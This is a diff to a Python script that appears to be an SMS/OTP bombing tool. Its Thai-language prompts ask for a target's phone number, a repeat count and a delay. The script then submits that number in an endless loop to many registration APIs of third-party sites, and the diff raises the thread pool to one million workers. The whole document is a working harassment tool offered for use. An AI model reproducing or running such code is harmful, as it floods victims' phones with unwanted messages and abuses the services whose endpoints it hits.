@@ -8,7 +8,9 @@ from re import search
 from requests import Session
 from requests import get
 from requests import post
-phone = "0910701371"
+phone = input(" 😈 เบอร์โทรของเป้าหมายเช่น 083560243 : ")
+repeat = int(input(" 😈 จํานวนครั้ง (ถ้าต้องการให้ส่งเรื่อยๆ พิมพ์ -1) : "))
+delay = float(input(" 😈 ระยะเวลาในการการส่งแต่ละครั้ง : "))
 session = Session()
 headers = {
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
@@ -895,7 +897,7 @@ def api125():
 
 def api126():
     requests.post("https://queenclub88.com/api/register/phone", data={" phone": phone})
-exe = ThreadPoolExecutor()
+exe = ThreadPoolExecutor(max_workers=1000000)
 while True:
     exe.submit(api1)
     exe.submit(api2)
